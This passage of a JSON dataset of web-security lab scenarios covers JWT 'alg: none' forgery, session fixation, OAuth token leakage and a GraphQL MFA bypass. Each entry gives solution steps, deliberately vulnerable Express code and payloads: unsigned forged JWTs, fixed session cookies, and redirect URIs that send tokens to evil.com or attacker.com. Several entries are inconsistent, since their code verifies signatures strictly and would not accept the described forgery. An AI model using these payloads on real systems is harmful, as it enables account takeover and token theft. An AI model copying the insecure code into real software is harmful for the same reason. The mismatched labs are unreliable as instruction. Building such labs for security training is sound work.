      "4. Send the forged token in Authorization: Bearer header to the /auth/callback endpoint.",
      "5. Verify you are now logged in as Carlos by accessing /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const validUsers = ['carlos', 'alice']; app.post('/auth/callback', (req, res) => { const token = req.body.id_token; const decoded = jwt.decode(token, { complete: true }); const sub = decoded.payload.sub; if (validUsers.includes(sub)) return res.send(`Logged in as ${sub}`); res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJjYXJsb3MiLCJpc3MiOiJmYWtlLWlzc3VlciJ9.fake-signature",
      "POST /auth/callback { \"id_token\": \"eyJ...\" }"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in login API",
    "Lab Description": "The login endpoint uses JWTs for authentication but does not enforce strict algorithm verification. The application trusts the 'alg' field from the JWT header. To solve: forge a valid JWT token for the user 'carlos' and access their account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture login JWT using Burp Suite after a successful login with your own account.",
      "Send the token to jwt.io and decode it. Observe that the 'alg' header is set to HS256.",
      "Replace the 'alg' with 'none' and remove the signature entirely.",
      "Change the payload 'username' value to 'carlos'.",
      "Send the forged token in the Authorization header using Postman and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 's3cr3t' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; const decoded = jwt.verify(token, 'supersecret'); res.send('Welcome ' + decoded.username); }); app.listen(4000, () => console.log('JWT Confusion Lab running on http://localhost:4000'));",
    "payloads": [
      "{\"alg\":\"none\",\"typ\":\"JWT\"}.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer <forged_token>"
    ]
  },
 
  {
    "Lab scenario": "OAuth implicit grant misconfiguration in third-party login",
    "Lab Description": "The application integrates with an OAuth provider using the implicit grant flow. However, it fails to validate the 'state' parameter, enabling CSRF-style token injection. To solve: steal an access token and log in as 'carlos'.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to initiate an OAuth login flow for your own account and capture the redirect URI with access token.",
      "Craft a malicious OAuth URL replacing your token with a stolen or valid token for 'carlos'.",
      "Remove or tamper with the 'state' parameter.",
      "Send the OAuth response redirect URL to the victim via phishing.",
      "Victim clicks the link and logs in using Carlos’s access token. Use the session to access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = { 'carlos': 'token-carlos', 'alice': 'token-alice' }; app.get('/oauth/callback', (req, res) => { const { access_token } = req.query; const user = Object.keys(users).find(u => users[u] === access_token); if (!user) return res.status(401).send('Invalid token'); sessions[req.ip] = user; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { const user = sessions[req.ip]; if (!user) return res.status(403).send('Not logged in'); res.send('Account of ' + user); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on http://localhost:4000'));",
    "payloads": [
      "https://example.com/oauth/callback?access_token=token-carlos",
      "https://evil.com/redirect?access_token=token-carlos",
      "Omission or manipulation of 'state' parameter"
    ]
  },
  {
    "Lab scenario": "Session Fixation via predictable session tokens in REST login flow",
    "Lab Description": "This lab simulates a REST-based login flow vulnerable to session fixation. The application sets session cookies prior to authentication but fails to regenerate them after login. To solve: Fixate a session ID, log in as your own user, and use the same session to authenticate as Carlos.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept pre-login GET /session request using Burp Suite to capture issued session cookie.",
      "Use Postman to login using your credentials with the pre-issued session cookie.",
      "Replay the same session cookie after modifying login body with victim's credentials.",
      "Observe that session remains unchanged and now reflects authenticated Carlos context.",
      "Access /my-account endpoint with fixed session to confirm ownership of Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'notsecure', resave: false, saveUninitialized: true })); app.use(bodyParser.json()); const users = { 'wiener': 'testpass', 'carlos': 's3cret' }; app.get('/session', (req, res) => { res.send('Session initialized'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.send('Login successful'); } else { res.status(403).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.status(401).send('Not logged in'); }); app.listen(3000);",
    "payloads": [
      "GET /session",
      "POST /login {\"username\":\"wiener\", \"password\":\"testpass\"}",
      "POST /login {\"username\":\"carlos\", \"password\":\"s3cret\"} using same session cookie"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in GraphQL API",
    "Lab Description": "This GraphQL-based API uses JWTs for authentication but insecurely supports the 'none' algorithm. The application fails to validate signed tokens properly. To solve: Forge a JWT with 'none' algorithm and access Carlos’s account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept Authorization header after logging in with valid credentials.",
      "Decode JWT at jwt.io and analyze its algorithm and payload structure.",
      "Craft a forged token with 'alg':'none' and 'username':'carlos' using a custom script.",
      "Replace original token in Authorization header with forged JWT using Postman.",
      "Send GraphQL query `{ me { username, email } }` to validate token impersonates Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); app.use(bodyParser.json()); const users = { 'carlos': 'secret123' }; const schema = buildSchema(`type Query { me: User } type User { username: String, email: String }`); const root = { me: (args, context) => { if (!context.user) throw new Error('Unauthorized'); return { username: context.user, email: `${context.user}@example.com` }; } }; app.use('/graphql', (req, res, next) => { const auth = req.headers.authorization; if (auth) { const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, 'topsecret', { algorithms: ['HS256', 'none'] }); req.user = decoded.username; } catch (e) {} } next(); }, graphqlHTTP(req => ({ schema, rootValue: root, graphiql: false, context: { user: req.user } }))); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer <unsigned JWT with 'none'>",
      "GraphQL Query: { me { username, email } }"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration leaking access_token via referer header",
    "Lab Description": "This app uses OAuth 2.0 implicit grant flow for login but fails to sanitize referer headers. Tokens are leaked via open redirect endpoint after authorization. To solve: Leak Carlos’s access token and replay it to gain access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth flow using Burp Suite and capture redirect with access_token in URL fragment.",
      "Redirect user to an attacker-controlled domain that logs the full referer.",
      "Observe that full access_token is leaked in Referer header due to misconfigured redirect_uri.",
      "Extract Carlos's access_token from Referer logs and replay it using Postman.",
      "Access /my-account endpoint with Bearer token to confirm session hijack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'token-abc123' }; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, username } = req.query; if (username === 'carlos') res.redirect(`${redirect_uri}#access_token=token-abc123`); else res.redirect(`${redirect_uri}#error=unauthorized`); }); app.get('/account', (req, res) => { const auth = req.headers.authorization; if (auth && auth.split(' ')[1] === 'token-abc123') res.send('Welcome Carlos'); else res.status(403).send('Forbidden'); }); app.listen(5000);",
    "payloads": [
      "GET /oauth/authorize?redirect_uri=https://attacker.com/log&username=carlos",
      "Referer leak: https://attacker.com/log#access_token=token-abc123",
      "Authorization: Bearer token-abc123"
    ]
  },
  {
    "Lab scenario": "Session fixation via login CSRF",
    "Lab Description": "This lab is vulnerable to session fixation due to improper handling of session cookies. The application accepts a session cookie set prior to authentication and does not regenerate it upon login. To solve the lab, fixate a session on Carlos’s browser and access his My account page after he logs in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP or Burp Suite to capture a request to /login and observe session cookie behavior before and after login.",
      "2. Note that the session cookie (e.g., sessionId) is preserved after successful authentication.",
      "3. Construct a malicious link with a pre-defined session cookie and trick Carlos into clicking it using a CSRF delivery method.",
      "4. Wait for Carlos to log in while his browser holds your predefined session cookie.",
      "5. Reuse the same session cookie in your browser to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = user.username; res.redirect('/my-account'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.username) { res.send('My account page for ' + req.session.username); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
    "payloads": [
      "GET /login HTTP/1.1\\nCookie: sessionId=attacker-session-id",
      "POST /login HTTP/1.1\\nCookie: sessionId=attacker-session-id\\nusername=carlos&password=letmein",
      "Use <img src='/login?sessionId=attacker-session-id'> as CSRF bait"
    ]
  },
  {
    "Lab scenario": "JWT signature validation bypass via alg=none",
    "Lab Description": "The application relies on JWTs to manage sessions but fails to enforce the use of a strong signature algorithm. It incorrectly accepts tokens using 'alg: none'. To solve the lab, forge a valid token to impersonate the admin user and access the /admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman or Burp to intercept a request with an Authorization: Bearer header and decode the JWT.",
      "2. Observe the algorithm used in the header. Confirm the app accepts tokens signed with 'alg: none' (e.g., via test fuzzing).",
      "3. Manually craft a JWT with alg set to none and payload {\"username\": \"admin\"}. Do not sign the token.",
      "4. Send the forged token in the Authorization header to access the /admin endpoint.",
      "5. Confirm access by observing a welcome message or admin content."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; try { const payload = jwt.verify(token, SECRET, { algorithms: ['HS256', 'none'] }); if (payload.username === 'admin') return res.send('Welcome admin'); res.status(403).send('Not authorized'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
      "Payload: { \"username\": \"admin\" }",
      "Token: base64(header) + '.' + base64(payload) + '.'"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leakage via referer",
    "Lab Description": "This application implements OAuth 2.0 using the implicit grant flow. Access tokens are transmitted in the URL fragment, but a misconfigured redirect leaks them via the Referer header. To solve the lab, steal Carlos’s token and access his account via the OAuth endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Start Burp Suite and proxy all traffic. Initiate the OAuth flow and observe the redirect URI structure.",
      "2. Notice the access_token is returned in the URI fragment: /callback#access_token=abc123...",
      "3. Modify your profile to include a third-party controlled redirect_uri that causes a secondary HTTP request (e.g., loading an image).",
      "4. Capture the Referer header containing the access_token using a Burp Collaborator server.",
      "5. Replay the token in an Authorization header to access Carlos’s account page at /oauth/profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { res.send('<html><img src=\"https://attacker.com/log?ref=' + req.headers.referer + '\"></html>'); }); app.get('/oauth/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-access-token') res.send('Carlos profile'); else res.status(401).send('Invalid token'); }); app.listen(4000);",
    "payloads": [
      "redirect_uri=https://vulnerable-app.com/oauth/callback",
      "Modify profile: https://attacker.com#access_token=steal",
      "Access with Authorization: Bearer carlos-access-token"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm bypass in Authorization header",
    "Lab Description": "This lab's authentication mechanism relies on a stateless JWT in the Authorization header. However, the server fails to properly validate the algorithm used to sign tokens. The application accepts tokens with the alg field set to 'none', which disables signature verification entirely. To solve: Forge a JWT that grants access to Carlos's account using the none algorithm.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a legitimate login and extract the JWT from the Authorization header.",
      "2. Decode the JWT using jwt.io or any Base64 decoder and inspect the header and payload structure.",
      "3. Modify the alg field in the JWT header to 'none' and change the payload to { \"username\": \"carlos\" }.",
      "4. Remove the signature portion of the JWT, then reassemble the token as header.payload.",
      "5. Send a GET request to /my-account with the forged JWT in the Authorization header using Postman or Burp Repeater."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username === 'carlos') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } } catch (err) { res.status(400).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Bypass Lab running on port 4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID",
    "Lab Description": "The login system uses a session identifier that is not regenerated upon successful authentication. Additionally, the session ID is predictable and can be set by the attacker in the request. To solve: Fix a session ID before login, trick the victim into logging in, and then use the fixed session ID to impersonate them.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept a GET /login request using Burp Suite and observe that the session cookie is not changed post-authentication.",
      "2. Use Burp to set the session cookie to a known fixed value like attacker-session-123 before sending the login request.",
      "3. Trick the victim into using the same session cookie (simulate with a second login request using the same session cookie).",
      "4. After the victim logs in with that session ID, use Burp Repeater to send a GET /my-account request with the same cookie.",
      "5. Confirm access to Carlos's account by verifying the personalized response."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 's3cret' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); const sid = req.cookies.session || req.query.sid || 'sess-' + Math.random().toString(36).substr(2); if (user) { sessions[sid] = username; res.cookie('session', sid); res.send('Login successful'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; const user = sessions[sid]; if (user === 'carlos') { res.send('Welcome carlos!'); } else { res.send('Access denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "GET /login?username=carlos&password=s3cret HTTP/1.1\\nCookie: session=attacker-session-123",
      "GET /my-account HTTP/1.1\\nCookie: session=attacker-session-123"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via redirect URI manipulation",
    "Lab Description": "The application uses OAuth for login but allows open redirect behavior via an improperly validated redirect_uri parameter. This enables an attacker to capture the OAuth token by redirecting it to an external site. To solve: Exploit the open redirect to intercept Carlos's OAuth token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Start Burp and analyze the OAuth login flow. Identify the redirect_uri parameter in the authorization request.",
      "2. Change the redirect_uri to an attacker-controlled domain (e.g., https://evil.com) and send the modified link to the victim (simulate this by manually using the link).",
      "3. Observe that the OAuth token is leaked to https://evil.com via the query string.",
      "4. Copy the leaked token and use Postman to send a request to /my-account with the Bearer token in the Authorization header.",
      "5. Confirm successful access to Carlos's account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const oauthTokens = { 'valid-oauth-token': 'carlos' }; app.get('/oauth/callback', (req, res) => { const { token, redirect_uri } = req.query; if (token && oauthTokens[token]) { res.redirect(redirect_uri + '?token=' + token); } else { res.status(400).send('Invalid token'); } }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (oauthTokens[token] === 'carlos') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('OAuth Redirect Lab running on port 4000'));",
    "payloads": [
      "https://vulnerable-site.com/oauth/callback?token=valid-oauth-token&redirect_uri=https://evil.com",
      "Authorization: Bearer valid-oauth-token"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm attack in Authorization Header",
    "Lab Description": "The application's JWT implementation fails to properly validate the algorithm specified in the token header. The application uses a symmetric secret to sign JWTs, but does not enforce the algorithm value. To solve: Forge a valid JWT with 'alg':'none' and access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a valid login request and capture the JWT from the Authorization header.",
      "2. Decode the JWT using jwt.io or Postman and observe that the algorithm used is HS256.",
      "3. Modify the header to set \"alg\":\"none\" and remove the signature portion.",
      "4. In the payload, change the role to \"admin\" and re-encode the JWT without a signature.",
      "5. Use Burp Repeater to send a request to /admin with the forged JWT in the Authorization header. Verify access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.role === 'admin') { res.send('Welcome Admin'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000, () => console.log('JWT None Alg Lab running on http://localhost:4000'));",
    "payloads": [
      "Header: { \"alg\": \"none\", \"typ\": \"JWT\" } Payload: { \"username\": \"carlos\", \"role\": \"admin\" }",
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leads to account takeover via email claim",
    "Lab Description": "The application uses an external OAuth provider for social login. It trusts the email claim from the OAuth token without verifying domain ownership or user identity. To solve: Forge an OAuth token containing Carlos's email and gain access to his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP or Burp Suite to monitor the OAuth callback flow and capture the JWT from the provider.",
      "2. Decode the token using jwt.io and inspect the claims including 'email'.",
      "3. Create a forged JWT with 'email': 'carlos@example.com', signed with a known public client secret (or none if not validated).",
      "4. Send the forged token to the /oauth/callback endpoint using Postman.",
      "5. Verify you are logged in as Carlos and access /my-account to complete the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/oauth/callback', (req, res) => { const { token } = req.body; try { const decoded = jwt.decode(token); if (decoded.email) { res.send(`Logged in as ${decoded.email}`); } else { res.status(400).send('Invalid token'); } } catch (e) { res.status(500).send('Error decoding token'); } }); app.get('/my-account', (req, res) => { res.send('Account details for carlos@example.com'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on http://localhost:4000'));",
    "payloads": [
      "{ \"email\": \"carlos@example.com\" }",
      "eyJhbGciOiJub25lIn0.eyJlbWFpbCI6ImNhcmxvc0BleGFtcGxlLmNvbSJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation via ID in URL query parameter",
    "Lab Description": "The session ID is accepted from URL query parameters and not regenerated upon successful login. This allows an attacker to preset a session ID for a victim and hijack the session after login. To solve: Fixate Carlos's session and access his account page after login.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to observe that the application accepts a session ID in the URL like /login?session=abcd1234.",
      "2. Send a crafted phishing link with a known session ID to the victim: /login?session=attacker123.",
      "3. Wait for Carlos to log in using the attacker-supplied session ID.",
      "4. Use the same session ID (attacker123) to access /my-account in your browser.",
      "5. Confirm that Carlos is authenticated under the attacker's session and access the account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/login', (req, res) => { const sid = req.query.session || Math.random().toString(36).substring(2); res.cookie('session', sid); sessions[sid] = { loggedIn: false }; res.send('Login page'); }); app.post('/login', (req, res) => { const sid = req.cookies.session; if (sid && sessions[sid]) { sessions[sid].loggedIn = true; sessions[sid].user = 'carlos'; res.send('Logged in'); } else { res.status(400).send('Invalid session'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; const session = sessions[sid]; if (session?.loggedIn && session.user === 'carlos') { res.send('Carlos account'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "/login?session=attacker123",
      "Set-Cookie: session=attacker123",
      "/my-account with Cookie: session=attacker123"
    ]
  },
  {
    "Lab scenario": "Session Fixation in OAuth Callback Flow",
    "Lab Description": "The application integrates OAuth login via a third-party provider. However, it is vulnerable to session fixation due to improper session regeneration during the OAuth callback phase. The application preserves the session ID between unauthenticated and authenticated states, enabling an attacker to fix a session ID and hijack a victim’s account. To solve the lab, force a victim to authenticate with a session you control, then access their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Using Burp Suite, intercept the OAuth flow starting with /auth/login?provider=google and note the Set-Cookie header with a session ID.",
      "2.With the victim unlogged, share a crafted OAuth login link including your fixed session ID.",
      "3.The victim completes authentication on the third-party provider and is redirected back to the app with your fixed session preserved.",
      "4.Observe that your session is now authenticated as the victim.",
      "5.Visit /my-account to verify access to the victim’s account and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 's3cr3t', resave: false, saveUninitialized: true })); app.get('/auth/login', (req, res) => { const redirectUrl = 'https://oauth.example.com/auth?client_id=123&redirect_uri=http://localhost:4000/callback'; res.redirect(redirectUrl); }); app.get('/callback', (req, res) => { req.session.user = { username: 'carlos', oauth: true }; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user.username}`); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "http://lab.com/auth/login?provider=google",
      "Session-ID: fixed-session-123",
      "http://lab.com/callback (after victim login)",
      "/my-account with fixed session"
    ]
  },
  {
    "Lab scenario": "JWT Signature Spoofing via 'none' Algorithm",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for session management. It accepts the algorithm field in the header without verification, allowing an attacker to modify the token and bypass signature checks by setting 'alg' to 'none'. To solve the lab, forge a JWT to impersonate the admin user and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Use Postman to log in and capture the Authorization Bearer JWT from the response.",
      "2.Copy the JWT to jwt.io and observe the 'alg' is HS256.",
      "3.Modify the JWT header to set \"alg\":\"none\" and set payload \"username\":\"admin\".",
      "4.Remove the signature portion and reassemble the JWT as header.payload.",
      "5.Send the modified token in the Authorization header and access /admin to verify admin access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'secret'); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none' || jwt.verify(token, 'secret')) { if (payload.payload.username === 'admin') return res.send('Welcome Admin'); } res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "Authorization: Bearer [header.payload]",
      "/admin"
    ]
  },
  {
    "Lab scenario": "MFA Bypass via Debug Parameter Injection in GraphQL",
    "Lab Description": "The application uses a GraphQL endpoint for authentication with multi-factor verification. However, due to insecure debug parameters left enabled in production, it's possible to bypass MFA using a special introspection query. To solve the lab, authenticate as the victim user by exploiting the debug parameter and access their account dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Burp Suite to inspect the GraphQL login mutation sent to /graphql endpoint.",
      "2.Observe a hidden query parameter `debug=true` is accepted and leaks MFA validation logic.",
      "3.Inject an introspection query with debug=true to reveal bypass mechanics.",
      "4.Modify the mutation to skip MFA challenge by sending { login(username: \"carlos\", password: \"s3cret\", skipMFA: true) } with debug=true.",
      "5.Verify access to /graphql?query={account} to confirm you're authenticated as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { 'carlos': { password: 's3cret', mfa: true } }; app.post('/graphql', (req, res) => { const { query } = req.body; const debug = req.query.debug === 'true'; if (query.includes('login')) { const [, username, password, skipMFA] = query.match(/login\\(username: \\\"(.*?)\\\", password: \\\"(.*?)\\\", skipMFA: (.*?)\\)/) || []; if (users[username] && users[username].password === password) { if (users[username].mfa && skipMFA !== 'true') return res.send({ error: 'MFA required' }); if (debug) return res.send({ success: true, user: username, debug: 'MFA bypassed' }); return res.send({ success: true, user: username }); } } res.status(401).send({ error: 'Unauthorized' }); }); app.listen(4000);",
    "payloads": [
      "{ login(username: \"carlos\", password: \"s3cret\", skipMFA: true) }",
      "/graphql?debug=true",
      "GraphQL Introspection Query",
      "POST /graphql with crafted mutation"
    ]
  },
  {
    "Lab scenario": "Session fixation via login flow mismanagement",
    "Lab Description": "This lab demonstrates a session fixation vulnerability caused by improper session ID handling during login. The application fails to generate a new session ID after authentication, allowing attackers to set a session ID before login. To solve: hijack Carlos’s session by fixing a known session ID before login, and access the account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Start Burp Suite and intercept the GET /login request to observe session initialization and the Set-Cookie response.",
      "Send a crafted GET /login request with a manually set session ID: Cookie: sessionId=attackerSessionID and forward the request.",
      "Capture the login POST request and send it to Burp Repeater. Modify it to use Carlos's credentials and attach the attackerSessionID cookie.",
      "Submit the request and observe that authentication succeeds without issuing a new session ID.",
      "Open a browser or Repeater with Cookie: sessionId=attackerSessionID and request /my-account to access Carlos’s account and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const users = [{ username: 'carlos', password: 'secret' }]; const sessions = {}; app.get('/login', (req, res) => { const sid = req.cookies.sessionId || Math.random().toString(36).substring(2); res.cookie('sessionId', sid); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionId] = username; res.send('Login successful'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sessionId]; if (username === 'carlos') { res.send('Carlos account page'); } else { res.send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "GET /login HTTP/1.1\\nCookie: sessionId=fixed123",
      "POST /login HTTP/1.1\\nCookie: sessionId=fixed123\\nusername=carlos&password=secret",
      "GET /my-account HTTP/1.1\\nCookie: sessionId=fixed123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via none algorithm",
    "Lab Description": "This lab's authentication mechanism uses JSON Web Tokens (JWTs) to verify user identity. However, the backend accepts tokens using the insecure 'none' algorithm. This allows attackers to forge valid tokens without a signature. To solve: forge a JWT token to impersonate the admin user and access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the login request and extract the JWT from the Authorization header.",
      "Decode the JWT using jwt.io or a script. Observe the 'alg' header and payload values.",
      "Modify the header to { \"alg\": \"none\", \"typ\": \"JWT\" } and the payload to { \"user\": \"admin\" }, leaving the signature part blank.",
      "Re-encode the JWT (Base64 header + '.' + Base64 payload + '.') and set it as the new Authorization: Bearer header.",
      "Send a GET request to /admin with the forged token and confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.use((req, res, next) => { const auth = req.headers.authorization; if (auth && auth.startsWith('Bearer ')) { const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, 'secret'); req.user = decoded.user; } catch (e) {} } next(); }); app.get('/admin', (req, res) => { if (req.user === 'admin') { res.send('Admin panel'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"user\":\"admin\"}",
      "Authorization: Bearer [base64(header)].[base64(payload)]."
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leakage via referer header",
